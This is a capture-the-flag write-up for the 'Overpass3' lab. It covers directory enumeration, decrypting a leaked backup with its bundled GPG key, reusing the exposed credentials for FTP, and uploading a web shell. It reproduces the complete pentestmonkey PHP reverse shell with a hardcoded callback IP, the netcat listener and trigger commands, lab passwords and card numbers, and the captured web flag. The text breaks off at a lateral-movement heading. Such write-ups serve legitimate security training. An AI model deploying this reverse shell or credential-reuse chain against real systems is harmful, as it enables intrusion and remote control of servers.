# Overpass3 — Writeup

## Overview
### Overpass3 — Writeup
### Overpass3 — Writeup

## Enumeration
```text
Initial foothold
***enumerating ports with rustscan***
port 80 open
Enumerating with gobuster allows to discover a hidden /backups directory. 
gobuster dir --url http://10.10.16.242 --wordlist /usr/share/wordlists/dirb/common.txt
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/backups              (Status: 301) [Size: 236] [--> http://10.10.16.242/backups/]
***found backup.zip***
wget http://10.10.16.242/backups/backup.zip
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip backup.zip         
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key     

Import the key and decrypt the file:
```
```text
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ gpg --import priv.key                                                                                
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```
```text
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ gpg --decrypt-file CustomerDetails.xlsx.gpg 
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 
      "Paradox <paradox@overpass.thm>"
      
Opening the CustomerDetails.xlsx spreadsheet shows the following information:

Customer Name 	Username 	Password 	Credit card number 	CVC
Par. A. Doxx 	paradox 	ShibesAreGreat123 	4111 1111 4555 1142 	432
0day Montgomery 	0day 	OllieIsTheBestDog 	5555 3412 4444 1115 	642
Muir Land 	muirlandoracle 	A11D0gsAreAw3s0me 	5103 2219 1119 9245 	737 

https://products.aspose.app/cells/es/viewer/view?FolderName=a1b2e4ac-7a2f-43a2-abe3-f972bfcfd8e8&FileName=CustomerDetails.xlsx&Uid=ac0b8ea0-6f8d-4bb3-b59a-51d6f9154c82.xlsx
opening with excel online
***FTP***

Connecting as paradox with ShibesAreGreat123 as password against the FTP service works.
```

## Exploitation
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.10.16.242         
Connected to 10.10.16.242.
220 (vsFTPd 3.0.3)
Name (10.10.16.242:kali): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||48349|)
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
We have access to the website’s sources, and the directory is writable. Let’s upload a PHP reverse shell: 
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||43515|)
150 Ok to send data.
100% |****************************************|  5489       10.74 MiB/s    00:00 ETA
226 Transfer complete.
5489 bytes sent in 00:00 (10.36 KiB/s)
***shell.php(from github pentestmonkey)***
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.18.1.77';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
***Reverse shell***
Start a listener (nc -nlvp 4444) and browse the shell that has just been uploaded (curl -s http://10.10.16.242/shell.php). We now have a reverse shell:
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
curl -s http://10.10.16.242/shell.php
connect to [10.18.1.77] from (UNKNOWN) [10.10.16.242] 42262
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:04:27 up 32 min,  0 users,  load average: 0.00, 0.00, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (854): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ curl -s http://10.10.16.242/shell.php
WARNING: Failed to daemonise.  This is quite common and not fatal.
Connection refused (111)
sh-4.4$
Web flag

After failing to find the flag by searching for files owned by the apache user or group, I eventually found the flag by searching for files matching *flag*: 
sh-4.4$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.4$ find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
-r--------  1 root root     0 Jul 28 22:05 /proc/kpageflags
-rw-r--r--  1 root root     0 Jul 28 22:05 /proc/sys/kernel/acpi_video_flags
-r--r-----  1 root root  4096 Jul 28 22:05 /sys/devices/platform/serial8250/tty/ttyS1/flags
-r--r-----  1 root root  4096 Jul 28 22:05 /sys/devices/platform/serial8250/tty/ttyS2/flags
-r--r-----  1 root root  4096 Jul 28 22:05 /sys/devices/platform/serial8250/tty/ttyS3/flags
-r--r-----  1 root root  4096 Jul 28 22:05 /sys/devices/pnp0/00:06/tty/ttyS0/flags
-rw-r--r--  1 root root  4096 Jul 28 22:05 /sys/devices/vif-0/net/eth0/flags
-rw-r--r--  1 root root  4096 Jul 28 22:05 /sys/devices/virtual/net/lo/flags
-rw-r--r--  1 root root  4096 Jul 28 22:05 /sys/module/scsi_mod/parameters/default_dev_flags
-rwxr-xr-x. 1 root root  2183 Nov  8  2019 /usr/bin/pflags
-rwsr-xr-x. 1 root root 12704 Apr 14  2020 /usr/sbin/grub2-set-bootflag
-rw-r--r--. 1 root root    38 Nov 17  2020 /usr/share/httpd/web.flag
-rw-r--r--. 1 root root   285 Apr 14  2020 /usr/share/man/man1/grub2-set-bootflag.1.gz
sh-4.4$ cat /usr/share/httpd/web.flag
cat /usr/share/httpd/web.flag
thm{0ae72f7870c3687129f7a824194be09d}
User Flag

Hint: This flag belongs to james 
Lateral move (www-data -> paradox)

